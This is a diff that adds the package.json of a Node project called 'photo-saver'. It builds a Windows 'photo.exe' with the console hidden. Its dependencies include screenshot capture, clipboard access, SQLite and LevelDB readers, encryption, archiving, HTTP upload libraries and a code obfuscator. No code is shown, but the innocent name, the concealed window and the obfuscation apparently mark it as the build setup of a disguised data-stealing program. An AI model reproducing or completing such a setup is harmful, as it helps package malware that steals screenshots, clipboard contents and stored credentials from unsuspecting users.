@@ -1,0 +1,48 @@
+{
+  "name": "photo-saver",
+  "version": "1.0.0",
+  "main": "saver.js",
+  "scripts": {
+    "build": "pkg . --targets node18-win-x64 --output photo.exe",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "description": "",
+  "dependencies": {
+    "adm-zip": "^0.5.16",
+    "archiver": "^7.0.1",
+    "axios": "^1.13.5",
+    "clipboardy": "^5.3.1",
+    "crypto-js": "^4.2.0",
+    "dotenv": "^17.4.2",
+    "form-data": "^4.0.5",
+    "fs-extra": "^11.3.3",
+    "javascript-obfuscator": "^5.3.0",
+    "level": "^10.0.0",
+    "node-fetch": "^2.7.0",
+    "screenshot-desktop": "^1.15.3",
+    "sqlite3": "^6.0.1"
+  },
+  "pkg": {
+    "targets": [
+      "node18-win-x64"
+    ],
+    "assets": [
+      "**/*.js",
+      "**/*.json",
+      "**/*.node"
+    ],
+    "ignore": [
+      "**/*.d.ts",
+      "**/*.map",
+      "**/test/**",
+      "**/*.test.js",
+      "**/javascript-obfuscator/**/node_modules/**"
+    ],
+    "windows": {
+      "console": false
+    }
+  }
+}
